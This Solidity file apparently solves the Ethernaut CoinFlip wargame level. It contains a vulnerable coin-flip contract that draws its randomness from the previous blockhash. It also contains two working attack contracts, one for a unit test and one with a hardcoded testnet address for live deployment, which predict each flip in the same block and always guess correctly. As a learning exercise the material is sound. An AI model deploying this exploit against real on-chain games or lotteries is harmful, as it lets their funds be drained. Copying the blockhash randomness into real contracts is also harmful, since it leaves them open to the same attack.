// SPDX-License-Identifier: MIT

// exercise code updated for > 0.8.0 solc
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/utils/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}


// solution used by unit test
// see https://solidity-by-example.org/hacks/randomness/
// compute answer by simply copying contract code, computing answer in attack
// contract then having attack contract call vulnerable contract with answer
contract CoinFlipAttack {

  using SafeMath for uint256;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  CoinFlip coinFlip;

  constructor(address _coinFlip) {
    coinFlip = CoinFlip(_coinFlip);
  }

  function attack() public {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip1 = blockValue.div(FACTOR);
    bool side = coinFlip1 == 1 ? true : false;

    coinFlip.flip(side);
  }
}


// solution used to deploy live to testnet
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/utils/math/SafeMath.sol';

// vulnerable contract stub with required function
contract CoinFlipLive {
    function flip(bool _guess) public returns (bool) {}
}

// attack contract
contract CoinFlipLiveAttack {

  using SafeMath for uint256;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  // todo: change this address to your vulnerable contract instance address
  // before deploying this file to testnet via remix
  address COIN_FLIP_ADDRESS = 0x2cA736b2498a0505Ff6a6Bee8D97747233A744c6;

  CoinFlipLive coinFlip;

  constructor() {
    coinFlip = CoinFlipLive(COIN_FLIP_ADDRESS);
  }

  function attack() public {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip1 = blockValue.div(FACTOR);
    bool side = coinFlip1 == 1 ? true : false;

    coinFlip.flip(side);
  }
}
